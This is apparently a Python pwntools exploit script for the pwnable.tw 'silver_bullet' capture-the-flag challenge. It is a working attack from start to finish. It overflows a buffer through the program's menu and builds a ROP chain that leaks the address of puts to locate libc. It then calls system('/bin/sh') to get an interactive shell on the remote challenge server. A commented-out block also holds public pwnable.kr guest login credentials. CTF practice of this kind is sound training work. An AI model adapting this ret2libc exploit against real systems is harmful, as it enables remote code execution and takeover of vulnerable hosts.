#!/usr/bin/env python
#-*- coding:utf-8 -*-
from pwn import *
import binascii
DEBUG = False
context.log_level = "debug"
if DEBUG:
	io = process("./silver_bullet")
	elf = ELF("./silver_bullet")
	libc = ELF("/lib32/libc.so.6")
else:
	"""s =  ssh(host='pwnable.kr',
         port=2222,
         user='unlink',
         password='guest'
        )"""
	io = remote("chall.pwnable.tw","10103")
	elf = ELF("./silver_bullet")
	libc = ELF("libc_32.so.6")

def Create(content):
	io.sendlineafter("Your choice :","1")
	io.sendlineafter("Give me your description of bullet :",content)

def Powerup(content):
	io.sendlineafter("Your choice :","2")
	#print io.recv()
	io.sendafter("Give me your another description of bullet :",content)

def Beat():
	io.sendlineafter("Your choice :","3")

def rop(eip,ret,p1,p2,p3):
	Create("s"*47)
	Powerup("a"*1)
	Powerup("fghijkl"+p32(eip)+p32(ret)+p32(p1)+p32(p2)+p32(p3))
	Beat()
	Beat()
	#Beat()
	io.recvuntil("Oh ! You win !!\n")
	puts_addr = u32(io.recvline()[0:4])
	log.info("put_got:"+hex(puts_addr))
	return puts_addr

def rop2(eip,ret,p1,p2,p3):
	Create("s"*47)
	Powerup("a"*1)
	Powerup("fghijkl"+p32(eip)+p32(ret)+p32(p1)+p32(p2)+p32(p3))
	Beat()
	Beat()
	#Beat()
	io.recvuntil("Oh ! You win !!\n")
	return 0

#gdb.attach(io,"b *0x08048989\nb *0x080487AF")
beat_addr = 0x080484A8
puts_got = elf.got["puts"]
poppop_ret = 0x08048a7a
main_addr = 0x08048954
string = 0x08048733
puts_addr = rop(beat_addr,poppop_ret,puts_got,puts_got,main_addr)
libc_base = puts_addr - libc.symbols["puts"]
system_addr = libc_base + libc.symbols["system"]
binsh_addr = libc_base + libc.search("/bin/sh").next()
rop2(system_addr,poppop_ret,binsh_addr,binsh_addr,main_addr)
io.interactive()
